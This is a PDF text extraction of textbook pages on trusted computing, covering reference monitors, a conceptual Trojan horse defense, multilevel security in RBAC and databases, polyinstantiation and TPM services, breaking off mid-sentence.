       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 872, 'page_label': '27-19'}, page_content='27.3 / THE ConCEPT oF TRuSTEd SySTEMS  27-19\\nFigure 27.7 Refer ence Monitor Concept\\nAudit\\nﬁle\\nSubjects Objects\\nSecurity kernel\\ndatabase\\nSubject: security\\nclearance\\nObject: security\\nclassiﬁcation\\nReference\\nmonitor\\n(policy)\\nReference Monitors\\nInitial work on trusted computers and trusted operating systems was based on the \\n reference monitor concept, depicted in \\nFigure 27.7. The reference monitor is a con-\\ntrolling element in the hardware and operating system of a computer that regulates \\nthe access of subjects to objects on the basis of security parameters of the subject \\nand object. The reference monitor has access to a file, known as the security  kernel \\n database,\\n that lists the access privileges (security clearance) of each subject and \\nthe protection attributes (classification level) of each object. The reference moni-\\ntor enforces the security rules (no read up, no write down) and has the following \\nproperties:\\n• Complete mediation:\\n The security rules are enforced on every access, not just, \\nfor example, when a file is opened.\\n• Isolation: \\nThe reference monitor and database are protected from unauthorized \\nmodification.\\n• Verifia\\nbility: The reference monitor’s correctness must be provable. That is, it \\nmust be possible to demonstrate mathematically that the reference monitor \\nenforces the security rules and provides complete mediation and isolation.\\nThese are stiff requirements. The requirement for complete mediation means \\nthat every access to data within main memory and on disk and tape must be mediated. \\nPure software implementations impose too high a performance penalty to be practi-\\ncal; the solution must be at least partly in hardware. The requirement for isolation \\nM27_STAL0611_04_GE_C27.indd   19 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 873, 'page_label': '27-20'}, page_content='27-20  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\nmeans it must not be possible for an attacker, no matter how clever, to change the \\nlogic of the reference monitor or the contents of the security kernel database. Finally, \\nthe requirement for mathematical proof is formidable for something as complex as \\na general-purpose computer. A system that can provide such verification is referred \\nto as a trustworthy system.\\nA final element illustrated in \\nFigure 27.7 is an audit file. Important security \\nevents, such as detected security violations and authorized changes to the security \\nkernel database, are stored in the audit file.\\nIn an effort to meet its own needs and as a service to the public, the U.S. \\nDepartment of Defense in 1981 established the Computer Security Center within \\nthe National Security Agency (NSA) with the goal of encouraging the widespread \\navailability of trusted computer systems. This goal is realized through the center’s \\nCommercial Product Evaluation Program. In essence, the center attempts to evaluate \\ncommercially available products as meeting the security requirements just outlined. \\nThe center classifies evaluated products according to the range of security features \\nthat they provide. These evaluations are needed for Department of Defense pro-\\ncurements but are published and freely available. Hence, they can serve as guidance \\nto commercial customers for the purchase of commercially available, off-the-shelf \\nequipment.\\nTrojan Horse Defense\\nOne way to secure against Trojan horse attacks is the use of a secure, trusted  operating \\nsystem. \\nFigure 27.8 illustrates an example. In this case, a Trojan horse is used to get \\naround the standard security mechanism used by most file management and oper -\\nating systems: the access control list. In this example, a user named Bob interacts \\nthrough a program with a data file containing the critically sensitive character string \\n“CPE170KS.” Bob has created the file with read/write permission provided only to \\nprograms executing on his own behalf: that is, only processes that are owned by Bob \\nmay access the file.\\nThe Trojan horse attack begins when a hostile user, named Alice, gains legiti-\\nmate access to the system and installs both a Trojan horse program and a private \\nfile to be used in the attack as a “back pocket.” Alice gives read/write permission \\nto herself for this file and gives Bob write-only permission (see Figure 27.8a). Alice \\nnow induces Bob to invoke the Trojan horse program, perhaps by advertising it as a \\nuseful utility. When the program detects that it is being executed by Bob, it reads the \\nsensitive character string from Bob’s file and copies it into Alice’s back-pocket file \\n(see Figure 27.8b). Both the read and write operations satisfy the constraints imposed \\nby access control lists. Alice then has only to access Bob’s file at a later time to learn \\nthe value of the string.\\nNow consider the use of a secure operating system in this scenario (see \\n Figure\\xa027.8c).\\n Security levels are assigned to subjects at logon on the basis of criteria \\nsuch as the terminal from which the computer is being accessed and the user involved, \\nas identified by password/ID. In this example, there are two security levels, sensitive \\nand public, ordered so sensitive is higher than public. Processes owned by Bob and \\nBob’s data file are assigned the security level sensitive. Alice’s file and processes are \\nrestricted to public. If Bob invokes the Trojan horse program (see Figure 27.8d), that \\nM27_STAL0611_04_GE_C27.indd   20 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 874, 'page_label': '27-21'}, page_content='27.4 / APPliCATion oF MulT il E v E l  SEC u R i T y  27-21\\nprogram acquires Bob’s security level. It is therefore able, under the simple security \\nproperty, to observe the sensitive character string. When the program attempts to \\nstore the string in a public file (the back-pocket file), however, the *-property is vio-\\nlated, and the attempt is disallowed by the reference monitor. Thus, the attempt to \\nwrite into the back-pocket file is denied even though the access control list permits \\nit: The security policy takes precedence over the access control list mechanism.\\n 27. 4  APPLIC ATION OF MULTILEVEL SECURITY\\nMultilevel security can be defined as follows:\\nFigure 27.8 T rojan Horse and Secure Operating System\\nReference\\nmonitor\\nAlice: RW\\nBob: W\\nBack-pocket\\nﬁle\\n(a)\\nData ﬁle\\nBob\\nA lice\\nProgram\\nProgram\\n“CPE170KS”\\nBob: RW\\nAlice: RW\\nBob: W\\nBack-pocket\\nﬁle\\n(b)\\nData ﬁle\\nBob\\nA lice\\nProgram\\nProgram\\n“CPE170KS”\\nBob: RW\\nAlice: RW\\nBob: W\\nBob: RW\\nBack-pocket\\nﬁle\\n(c)\\nData ﬁle\\nBob\\nAlice\\nProgram\\nReference\\nmonitor\\nProgram\\n“CPE170KS”\\nAlice: RW\\nBob: W\\nBob: RW\\nBack-pocket\\nﬁle\\n(d)\\nData ﬁle\\nBob\\nAlice\\nProgram\\nProgram\\n“CPE170KS”\\nMultilevel Security (MLS): A mode of system operation wherein (a) two or more \\nsecurity levels of information are allowed to be to be handled concurrently within \\nthe same system when some users having access to the system have neither a secu-\\nrity clearance nor need-to-know for some of the data handled by the system and \\n(b) separation of the users and the classified material on the basis, respectively, \\nof clearance and classification level are dependent on operating system control.\\nM27_STAL0611_04_GE_C27.indd   21 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 875, 'page_label': '27-22'}, page_content='27-22  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\nMultilevel security is of interest when there is a requirement to maintain a \\nresource, such as a file system or database in which multiple levels of data sensitivity \\nare defined. The hierarchy could be as simple as two levels (e.g., public and propri-\\netary) or could have many levels (e.g., the military unclassified, restricted, confi-\\ndential, secret, top secret). The preceding three \\nsections have introduced us to the \\nessential elements of multilevel security. In this section, we look at two applications \\nareas where MLS concepts have been applied: role-based access control system, and \\ndatabase security.\\nMultilevel Security for Role-Based Access Control3\\n[OSBO00] shows how a rule-based access control (RBAC) system can be used to \\nimplement the BLP multilevel security rules. Recall that the ANSI standard RBAC \\nspecification included the concept of administrative functions, which provide the \\ncapability to create, delete, and maintain RBAC elements and relations. It is  useful \\nhere to assign special administr\\native roles to these functions. With this in mind, \\nTable\\xa027.2 summarizes the components of an RBAC.\\nThe following formal specification indicates how a RBAC system can be used \\nto implement MLS access:\\n• Constraint on users: F\\nor each user u in the set of users U, a security clearance \\nL(u) is assigned. Formally, 5u /uni2208U[L(u) is given].\\n• Constraints on permissions: Each permission assigns a read or write  pe rmission \\nto an object o , and each object has one read and one write permission. All \\n3The reader may wish to review Section 4.5 before proceeding.\\nU, a set of users\\nR and AR, disjoint sets of (regular) roles and administrative roles\\nP and AP, disjoint sets of (regular) permissions and administrative permissions\\nS, a set of sessions\\nPA /uni2286P * R, a many-to-many permission to role assignment relation\\nAPA /uni2286AP * AR, a many-to-many permission to administrative role assignment relation\\nUA /uni2286U * R, a many-to-many user to role assignment relation\\nAUA /uni2286U * AR, a many-to-many user to administrative role assignment relation\\nRH /uni2286R * R, a partially ordered role hierarchy\\nARH /uni2286AR * AR, partially ordered administrative role hierarchy\\n(both hierarchies are written as Ú  in infix notation)\\nUser: S S U, a function mapping each session si to the single user user(si) (constant for the session’s \\nlifetime)\\nRoles: S S 2RUAR maps each session si to a set of roles and administrative roles\\nRoles: (Si /uni22865r/H20841E r/uni2032Ú r) [(user (si),r/uni2032) /uni2208U A h AU A]6 (which can change with time) sessions si \\nhas the permissions hr/uni2208 roles(si) 5p/H20841(Er/uni2033… r) /uni2208PAhAPA]6\\nThere is a collection of constraints stipulating which values of the various components enumerated \\nabove are allowed or forbidden.\\nTable 27.2  RBAC Elements\\nM27_STAL0611_04_GE_C27.indd   22 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 876, 'page_label': '27-23'}, page_content='27.4 / APPliCATion oF MulT il E v E l  SEC u R i T y  27-23\\nobjects have a security classification. Formally, P = 5(o,r),(o,w)/H20841o is an object \\nin the system6; 5o /uni2208P[L(o) is given].\\n• Definitions:  The read-level of a role r , denoted r-level(r ), is the least upper \\nbound of the security levels of the objects for which (o , r) is in the permis-\\nsions of r . The w-level of a role r  (denoted w-level(r )) is the greatest lower \\nbound (glb) of the security levels of the objects o  for which (o , w) is in the \\npermissions of r , if such a glb exists. If the glb does not exist, the w-level is \\nundefined.\\n•\\n Constraints on U\\nA: Each role r has a defined write-level, denoted w-level(r). For \\neach user assignment, the clearance of the user must dominate the r-level of the \\nrole and be dominated by the w-level of the role. Formally, 5r /uni2208UA [w-level(r) \\nis defined]; 5(u,r) /uni2208UA [L(u) Ú r@level(r)]; 5(u,r) /uni2208UA [L(u) … w@level(r)].\\nThe preceding definitions and constraints enforce the BLP model. A role can \\ninclude access permissions for multiple objects. The r-level of the role indicates the \\nhighest security classification for the objects assigned to the role. Thus, the simple \\nsecurity property (no read up) demands that a user can be assigned to a role only if \\nthe user’s clearance is at least as high as the r-level of the role. Similarly, the w-level \\nof the role indicates the lowest security classification of its objects. The *-security \\nproperty (no write down) demands that a user be assigned to a role only if the user’s \\nclearance is no higher than the w-level of the role.\\nDatabase Security and Multilevel Security\\nThe addition of multilevel security to a database system increases the complexity \\nof the access control function and of the design of the database itself. One key issue \\nis the granularity of classification. The following are possible methods of imposing \\nmultilevel security on a relational database, in terms of the granularity of classifica-\\ntion (see Figure 27.9):\\n•\\n Entir\\ne database: This simple approach is easily accomplished on an MLS \\nplatform. An entire database, such as a financial or personnel database, could \\nbe classified as confidential or restricted and maintained on a server with \\nother files.\\n•\\n Individual ta\\nbles (relations): For some applications, it is appropriate to assign \\nclassification at the table level. In the example of Figure 27.9a, two levels of \\nclassification are defined: unrestricted (U) and restricted (R). The Employee \\ntable contains sensitive salary information and is classified restricted, while the \\nDepartment table is unrestricted. This level of granularity is relatively easy to \\nimplement and enforce.\\n•\\n Individual \\ncolumns (attributes): A security administrator may choose to \\ndetermine classification on the basis of attributes, so that selected columns \\nare classified. In the example of Figure 27.9b, the administrator determines \\nthat salary information, and the identity of department managers is restricted \\ninformation.\\n•\\n Individual \\nrows (tuples): In other circumstances, it may make sense to assign \\nclassification levels on the basis of individual rows that match certain properties. \\nM27_STAL0611_04_GE_C27.indd   23 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 877, 'page_label': '27-24'}, page_content='27-24  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nFigure 27.9\\n A\\npproaches to Database Classification\\nDid - U\\n4\\n4\\n4\\n8\\n8\\nName - U\\nAndy\\nCalvin\\nCathy\\nJames\\nZiggy\\nSalary - R\\n43K\\n35K\\n48K\\n55K\\n67K\\nEid - U\\n2345\\n5088\\n7712\\n9664\\n3054\\nEmployee Table\\n(b) Classiﬁed by column (attribute)\\n(a) Classiﬁed by table\\nName\\nAndy\\nCalvin\\nCathy\\nJames\\nZiggy\\nDid\\n4\\n4\\n4\\n8\\n8\\nSalary\\n43K\\n35K\\n48K\\n55K\\n67K\\nEid\\n2345\\n5088\\n7712\\n9664\\n3054\\nEmployee Table - R\\nDid\\n4\\n8\\nName\\naccts\\nPR\\nMgr\\nCathy\\nJames\\nDepartment Table - U\\nDid - U\\n4\\n8\\nName - U\\naccts\\nPR\\nMgr - R\\nCathy\\nJames\\nDepartment Table\\nDid\\n4 - U\\n4 - U\\n4 - U\\n8 - U\\n8 - U\\nName\\nAndy - U\\nCalvin - U\\nCathy - U\\nJames - U\\nZiggy - U\\nSalary\\n43K - U\\n35K - U\\n48K - U\\n55K - R\\n67K - R\\nEid\\n2345 - U\\n5088 - U\\n7712 - U\\n9664 - U\\n3054 - U\\nEmployee Table\\n(d) Classiﬁed by element\\n(c) Classiﬁed by row (tuple)\\nName\\nAndy\\nCalvin\\nCathy\\nJames\\nZiggy\\nDid\\n4\\n4\\n4\\n8\\n8\\nSalary\\n43K\\n35K\\n48K\\n55K\\n67K\\nEid\\n2345\\n5088\\n7712\\n9664\\n3054\\nU\\nU\\nU\\nR\\nR\\nEmployee Table\\nDid\\n4\\n8\\nName\\naccts\\nPR\\nMgr\\nCathy\\nJames\\nR\\nU\\nDepartment Table\\nDid\\n4 - U\\n8 - U\\nName\\naccts - U\\nPR - U\\nMgr\\nCathy - R\\nJames - R\\nDepartment Table\\nM27_STAL0611_04_GE_C27.indd   24 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 878, 'page_label': '27-25'}, page_content='27.4 / APPliCATion oF MulT il E v E l  SEC u R i T y  27-25\\nIn the example of Figure 27.9c, all rows in the Department table that contain \\ninformation relating to the Accounts Department (Dept. ID = 4), and all rows \\nin the Employee table for which the Salary is greater than 50K are restricted.\\n•\\n Ind\\nividual elements: The most difficult scheme to implement and manage is \\none in which individual elements may be selectively classified. In the exam-\\nple of Figure 27.9d, salary information and the identity of the manager of the \\nAccounts Department are restricted.\\nThe granularity of the classification scheme affects the way in which access con-\\ntrol is enforced. In particular, efforts to prevent inference depend on the granularity \\nof the classification.\\nRead access For read access, a database system needs to enforce the simple \\nsecurity rule (no read up). This is straightforward if the classification granularity \\nis the entire database or at the table level. Consider now a database classified by \\ncolumn (attribute). For example, in Figure 27.9b, suppose a user with only unre-\\nstricted clearance issues the following SQL query:\\nSELECT Ename\\n  FROM Employee\\n  WHERE Salary > 50K\\nThis query returns only unrestricted data but reveals restricted information, namely \\nwhether any employees have a salary greater than 50K and, if so, which employees. \\nThis type of security violation can be addressed by considering not only the data \\nreturned to the user, but also any data that must be accessed to satisfy the query. In \\nthis case, the query requires access to the Salary attribute, which is unauthorized for \\nthis user; therefore, the query is rejected.\\nIf classification is by row (tuple) rather than column, then the preceding query \\ndoes not pose an inference problem. Figure 27.9c shows that in the Employee table, \\nall rows corresponding to salaries greater than 50K are restricted. Because all such \\nrecords will be removed from the response to the preceding query, the inference just \\ndiscussed cannot occur. However, some information may be inferred, because a null \\nresponse indicates either that salaries above 50 are restricted, or no employee has a \\nsalary greater than 50K.\\nThe use of classification by rows instead of columns creates other inference \\nproblems. For example, suppose we add a new Projects table to the database of \\n Figure\\xa0\\n27.9c consisting of attributes Eid, ProjectID, and ProjectName, where the Eid \\nfield in the Employee and Projects tables can be joined. Suppose all records in the \\nProjects table are unrestricted except for projects with ProjectID 500 through 599. \\nConsider the following request:\\nSELECT Ename\\n    WHERE Employee.Eid = Projects.Eid\\n    AND Projects.ProjectID = 500\\nM27_STAL0611_04_GE_C27.indd   25 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 879, 'page_label': '27-26'}, page_content='27-26  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nThis request, if granted, returns information from the Employee table, which is \\nunrestricted, although it reveals restricted information, namely that the selected \\nemployees are assigned to project 500. As before, the database system must consider \\nnot just the data returned to the user but any data that must be accessed to satisfy \\nthe query.\\nClassification by element does not introduce any new considerations. The \\n system must pr\\nevent not only a read up, but also a query that must access higher-\\nlevel elements in order to satisfy the query.\\nAs a general comment, we can say that dealing with read access is far simpler \\nif the classification granularity is database or table. If the entire database has a single \\nclassification, then no new inference issues are raised. The same is true of classifica-\\ntion by table. If some finer-grained classification seems desirable, it might be possible \\nto achieve the same effect by splitting tables.\\nWRite access For write access, a database system needs to enforce the *-security \\nrule (no write down). But this is not as simple as it may seem. Consider the following \\nsituation. Suppose the classification granularity is finer than the table level (i.e., by \\ncolumn, by row, or by element) and that a user with a low clearance (unrestricted) \\nrequests the insertion of a row with the same primary key as an existing row where \\nthe row or one of its elements is at a higher level. The DBMS has essentially three \\nchoices:\\n1.\\n Notify the user that a r\\now with the same primary key already exists and reject \\nthe insertions. This is undesirable because it informs the user of the existence \\nof a higher-level row with the specified primary key value.\\n2.\\n R\\neplace the existing row with the new row classified at the lower level. This is \\nundesirable because it would allow the user to overwrite data not visible to the \\nuser, thus compromising data integrity.\\n3.\\n Insert the new r\\now at the lower level without modifying the existing row at the \\nhigher level. This is known as polyinstantiation. This avoids the inference and \\ndata integrity problems but creates a database with conflicting entries.\\nThe same alternatives apply when a user attempts to update a row rather than \\ninsert a row. To illustrate the effect of polyinstantiation, consider the following query \\napplied to Figure 27.9c by a user with a low clearance (U):\\nINSERT INTO Employee\\n  VALUES (James, 8, 35K, 9664, U)\\nThe table already contains a row for James with a higher salary level, which \\nnecessitates classifying the row as restricted. This new tuple would have an unre-\\nstricted classification. The same effect would be produced by an update:\\nUPDATE Employee\\n  SET Salary=35K\\n  WHERE Eid=9664\\nThe result is unsettling (see Figure 27.10). Clearly, James can only have one \\n salary\\n, and therefore, one of the two rows is false. The motivation for this is to prevent \\nM27_STAL0611_04_GE_C27.indd   26 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 880, 'page_label': '27-27'}, page_content='27.5 / TRu STE d  C o MP u T ing  A nd  THE TRu STE d  P l ATF o RM\\xa0M odul E   27-27\\ninference. If a unrestricted user queries the salary of James in the original database, \\nthe user’s request is rejected and the user may infer that salary is greater than 50K. \\nThe inclusion of the “false” row provides a form of cover for the true salary of James. \\nAlthough the approach may appear unsatisfactory, there have been a number of \\ndesigns and implementations of polyinstantiation [BERT95].\\nThe problem can be avoided by using a classification granularity of database or \\ntable, and in many applications, such granularity is all that is needed.\\n 27. 5  TR USTED COMPUTING AND THE TRUSTED \\nPLATFORM\\xa0MODULE\\nThe trusted platform module (TPM) is a concept being standardized by an industry \\nconsortium, the Trusted Computing Group. The TPM is a hardware module that is at \\nthe heart of a hardware/software approach to trusted computing. Indeed, the term \\ntrusted computing (TC) is now used in the industry to refer to this type of hardware/\\nsoftware approach.\\nThe TC approach employs a TPM chip in personal computer motherboard or \\na smart card or integrated into the main processor, together with hardware and soft-\\nware that in some sense has been approved or certified to work with the TPM. We \\ncan briefly describe the TC approach as follows.\\nThe TPM generates keys that it shares with vulnerable components that pass \\ndata around the system, such as \\n stor\\nage devices, memory components, and audio/\\nvisual hardware. The keys can be used to encrypt the data that flow throughout the \\nmachine. The TPM also works with TC-enabled software, including the OS and appli-\\ncations. The software can be assured that the data it receives are trustworthy, and the \\nsystem can be assured that the \\n softwar\\ne itself is trustworthy.\\nTo achieve these features, TC provides three basic services: authenticated boot, \\ncertification, and encryption.\\nAuthenticated Boot Service\\nThe authenticated boot service is responsible for booting the entire operating system \\nin stages and assuring that each portion of the OS, as it is loaded, is a version that is \\nFigure 27.10 Example of P olyinstantiation\\nName\\nAndy\\nCalvin\\nCathy\\nJames\\nJames\\nZiggy\\nDid\\n4\\n4\\n4\\n8\\n8\\n8\\nSalary\\n43K\\n35K\\n48K\\n55K\\n35K\\n67K\\nEmployee\\nEid\\n2345\\n5088\\n7712\\n9664\\n9664\\n3054\\nU\\nU\\nU\\nR\\nU\\nR\\nM27_STAL0611_04_GE_C27.indd   27 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 881, 'page_label': '27-28'}, page_content='27-28  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\napproved for use. Typically, an OS boot begins with a small piece of code in the Boot \\nROM. This piece brings in more code from the Boot Block on the hard drive and \\ntransfers execution to that code. This process continues with more and larger blocks \\nof the OS code being brought in until the entire OS boot procedure is complete and \\nthe resident OS is booted. At each stage, the TC hardware checks that valid software \\nhas been brought in. This may be done by verifying a digital signature associated \\nwith the software. The TPM keeps a tamper-evident log of the loading process, using \\na cryptographic hash function to detect any tampering with the log.\\nWhen the process is completed, the tamper-resistant log contains a record that \\nestablishes exactly, which version of the OS and its various modules are running. It \\nis now possible to expand the trust boundary to include additional hardware and \\napplication and utility software. The TC-enabled system maintains an approved list \\nof hardware and software components. To configure a piece of hardware or load a \\npiece of software, the system checks whether the component is on the approved list, \\nwhether it is digitally signed (where applicable), and whether its serial number has \\nnot been revoked. The result is a configuration of hardware, system software, and \\napplications that is in a well-defined state with approved components.\\nCertification Service\\nOnce a configuration is achieved and logged by the TPM, the TPM can certify the \\nconfiguration to other parties. The TPM can produce a digital certificate by signing a \\nformatted description of the configuration information using the TPM’s private key. \\nThus, another user, either a local user or a remote system, can have confidence that \\nan unaltered configuration is in use because:\\n1. The \\nTPM is considered trustworthy. We do not need a further certification of \\nthe TPM itself.\\n2. Only the TPM possesses this TPM’s private key. A recipient of the configuration \\ncan use the TPM’s public key to verify the signature (see \\nFigure 2.7b).\\nTo assure that the configuration is timely, a requester issues a “challenge” in \\nthe form of a random number when requesting a signed certificate from the TPM. \\nThe TPM signs a block of data consisting of the configuration information with the \\nrandom number appended to it. The requester therefore can verify the certificate is \\nboth valid and up to date.\\nThe TC scheme provides for a hierarchical approach to certification. The \\nTPM certifies the hardware/OS configuration. Then the OS can certify the presence \\nand configuration of application programs. If a user trusts the TPM and trusts the \\ncertified version of the OS, then the user can have confidence in the application’s \\nconfiguration.\\nEncryption Service\\nThe encryption service enables the encryption of data in such a way that the data \\ncan be decrypted only by a certain machine, and only if that machine is in a certain \\nconfiguration. There are several aspects of this service.\\nFirst, the TPM maintains a master secret key unique to this machine. From this \\nkey, the TPM generates a secret encryption key for every possible configuration of \\nM27_STAL0611_04_GE_C27.indd   28 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 882, 'page_label': '27-29'}, page_content='27.5 / TRuSTEd CoMPuTing And THE TRuSTEd PlA TFoRM\\xa0ModulE  27-29\\nthat machine. If data are encrypted while the machine is in one configuration, the \\ndata can only be decrypted using that same configuration. If a different configuration \\nis created on the machine, the new configuration will not be able to decrypt the data \\nencrypted by a different configuration.\\nThis scheme can be extended upward, as is done with certification. Thus, it \\nis possible to provide an encryption key to an application so that the application \\ncan encrypt data, and decryption can only be done by the desired version of the \\ndesired application running on the desired version of the desired OS. These encrypted \\ndata can be stored locally, only retrievable by the application that stored them, or \\n transmitted to a peer application on a remote machine. The peer application would \\nhave to be in the identical configuration to decrypt the data.\\nTPM Functions\\nFigure 27.11, based on the most recent TPM specification, is a block diagram of the \\nfunctional components of the TPM. These are as follows:\\n• I/O: \\nAll commands enter and exit through the I/O component, which provides \\ncommunication with the other TPM components.\\n• Cryptogra\\nphic co-processor: Includes a processor that is specialized for encryp-\\ntion and related processing. The specific cryptographic algorithms implemented \\nby this component include RSA encryption/decryption, RSA-based digital \\n signatures\\n, and symmetric encryption.\\nFigure 27.11 TPM Component Architectur e\\nI/O\\nCrytographic\\nco-processor\\nHMAC\\nengine\\nSHA-1\\nengine\\nOpt-in\\nNonvolatile\\nmemory\\nTrusted platform module (TPM)\\nPackaging\\nVolatile\\nmemory\\nExecution\\nengine\\nPower\\ndetection\\nRandom number\\ngenerator\\nKey\\ngeneration\\nM27_STAL0611_04_GE_C27.indd   29 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 883, 'page_label': '27-30'}, page_content='27-30  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\n• Key generation: Creates RSA public/private key pairs and symmetric keys.\\n• HMAC engine:\\n This algorithm is used in various authentication protocols.\\n• Random number generator (RNG):\\n This component produces random  numbers \\nused \\nin a variety of cryptographic algorithms, including key generation, random \\nvalues in digital signatures, and nonces. A nonce is a random number used once, \\nas in a challenge protocol. The RNG uses a hardware source of randomness \\n(manufacturer specific) and does not rely on a software algorithm that produces \\npseudo random numbers.\\n• SHA-1 engine:\\n This component implements the SHA algorithm, which is used \\nin digital signatures and the HMAC algorithm.\\n• Po\\nwer detection: Manages the TPM power states in conjunction with the \\n platform power states.\\n• Opt-in: Pr\\novides secure mechanisms to allow the TPM to be enabled or  disabled \\nat the customer/user’\\ns discretion.\\n• Execution engine:\\n Runs program code to execute the TPM commands received \\nfrom the I/O port.\\n• Nonv\\nolatile memory: Used to store persistent identity and state parameters \\nfor this TPM.\\n• Volatile memory: Temporary storage for execution functions, plus storage of \\nvolatile parameters, such as current TPM state, cryptographic keys, and session \\ninformation.\\nProtected Storage\\nTo give some feeling for the operation of a TC/TPM system, we look at the pro-\\ntected storage function. The TPM generates and stores a number of encryption \\nkeys in a trust hierarchy. At the root of the hierarchy is a storage root key gener-\\nated by the TPM and accessible only for the TPM’s use. From this key, other keys \\ncan be generated and protected by encryption with keys closer to the root of the \\nhierarchy.\\nAn important feature of Trusted Platforms is that a TPM protected object can \\nbe “sealed” to a 